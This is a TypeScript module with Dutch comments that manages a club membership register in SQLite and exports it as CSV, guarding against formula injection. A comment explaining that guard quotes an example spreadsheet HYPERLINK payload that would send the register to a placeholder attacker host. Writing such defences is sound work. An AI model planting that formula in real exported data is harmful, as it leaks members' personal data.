import { randomUUID } from "node:crypto";
import type { DatabaseSync } from "node:sqlite";

export type LidStatus = "aangemeld" | "lid" | "opgezegd";

export interface Lid {
  id: string; email: string; naam: string; status: LidStatus; aangemeldOp: string;
}

// Bewust een `type` en geen `interface`: een type-alias krijgt een impliciete
// indexsignatuur, waardoor de rij uit node:sqlite er rechtstreeks naartoe gecast
// kan worden. Bij een `interface` faalt dat met TS2352 en zou er een dubbele
// cast via `unknown` nodig zijn, en die schakelt de typecontrole helemaal uit.
type Rij = {
  id: string; email: string; naam: string; status: string; aangemeld_op: string;
};

const naarLid = (r: Rij): Lid => ({
  id: r.id, email: r.email, naam: r.naam,
  status: r.status as LidStatus, aangemeldOp: r.aangemeld_op,
});

export function meldAan(db: DatabaseSync, email: string, naam: string): Lid {
  if (naam.trim() === "") throw new Error("Naam mag niet leeg zijn");
  const lid: Lid = {
    id: randomUUID(), email: email.trim().toLowerCase(), naam: naam.trim(),
    status: "aangemeld", aangemeldOp: new Date().toISOString(),
  };
  db.prepare("INSERT INTO leden (id, email, naam, status, aangemeld_op) VALUES (?, ?, ?, ?, ?)")
    .run(lid.id, lid.email, lid.naam, lid.status, lid.aangemeldOp);
  return lid;
}

export function vindOpEmail(db: DatabaseSync, email: string): Lid | null {
  const r = db.prepare("SELECT * FROM leden WHERE email = ?").get(email.trim().toLowerCase());
  return r ? naarLid(r as Rij) : null;
}

export function zetStatus(db: DatabaseSync, id: string, status: LidStatus): void {
  const r = db.prepare("UPDATE leden SET status = ? WHERE id = ?").run(status, id);
  if (r.changes === 0) throw new Error(`Onbekend lid: ${id}`);
}

export function alleLeden(db: DatabaseSync): Lid[] {
  const rijen = db.prepare("SELECT * FROM leden ORDER BY aangemeld_op ASC").all();
  return (rijen as Rij[]).map(naarLid);
}

// Een veld dat begint met =, +, -, @, een tab of een carriage return laat
// Excel/LibreOffice het als formule uitvoeren zodra de aanhalingstekens
// eromheen bij het openen worden weggehaald (CSV-formule-injectie): een naam
// als `=HYPERLINK("https://kwaadaardig/"&A1,"klik")` kan zo het hele
// register naar een aanvaller lekken zodra een bestuurslid het bestand opent.
// Een voorafgaande apostrof voorkomt dat zonder de zichtbare tekst te raken.
const FORMULE_START = /^[=+\-@\t\r]/;

/** Een naam mag komma's en aanhalingstekens bevatten; die mogen geen kolom opschuiven. */
const veld = (w: string): string => {
  const beveiligd = FORMULE_START.test(w) ? `'${w}` : w;
  return `"${beveiligd.replace(/"/g, '""')}"`;
};

export function alsCsv(leden: Lid[]): string {
  const kop = "naam,email,status,aangemeld_op";
  const regels = leden.map((l) => [l.naam, l.email, l.status, l.aangemeldOp].map(veld).join(","));
  return [kop, ...regels].join("\n");
}
